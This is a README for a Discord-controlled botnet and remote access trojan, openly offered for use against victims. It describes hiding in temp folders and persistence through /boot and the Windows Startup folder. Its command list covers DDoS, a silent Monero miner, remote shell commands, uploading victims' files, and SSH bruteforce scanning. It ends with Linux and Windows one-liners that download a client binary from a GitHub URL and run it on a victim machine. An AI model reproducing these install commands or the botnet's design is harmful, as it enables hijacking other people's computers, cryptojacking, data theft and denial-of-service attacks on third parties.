# Discord.py BotNet
![image](https://user-images.githubusercontent.com/104208624/203850203-55e89e04-0f26-4d3c-b87f-e9d8be7ef81f.png)

https://discord.gg/vCdPTjD6rZ

# Developers
me: batu.sh#9675

bnt: @udbnt

# Features
* Hidden (Works in /tmp, %temp%)
* Persistence (Copying to /boot, shell:startup)
* Tested on Windows and Linux platforms
* DDoS attack uses "storm" script
* Mining uses "xmrig"

# Soon
* !webcampic
* !revshell < IP > < PORT >
* !nmap
* ?

# Bot Commands

* !sessions                              (List open sessions)
* !check                                 (Check miner & ddos status)
* !update                                (Update RAT)

* !ddos < IP >                           (Start DDoS Attack)
* !stopddos                              (Stop DDoS)

* !miner < WALLET >                      (Start slient XMR Crypto Miner CPU + AMD/INTEL GPU's)
* !stopminer                             (Stop miner)
* !zmap                                  (ZMap subnet scan) (Bruteforce ip addresses by: https://github.com/bntr00t/sshb)

# Self Commands

* !info.< HOSTNAME >@< IP >                      (Send IP Information)
* !shell.< HOSTNAME >@< IP > < CMD >             (Run command)
* !download.< HOSTNAME > < IP > < URL > < NAME > (Download file to victim)
* !upload.< HOSTNAME >@< IP > < PATH >           (Upload file to bot)
* !nmap.< HOSTNAME >@< IP >                      (Nmap subnet scan)

# Linux victim
cd /boot; apt-get update -y; apt-get install curl -y; [ -f "Client" ] && rm Client; curl -O Client "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 Client; ./Client

# Windows victim
cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" & if exist Client.exe del Client.exe & powershell -command Invoke-WebRequest https://github.com/NAME/NAME/raw/main/NAME.exe -OutFile Client.exe & Client.exe
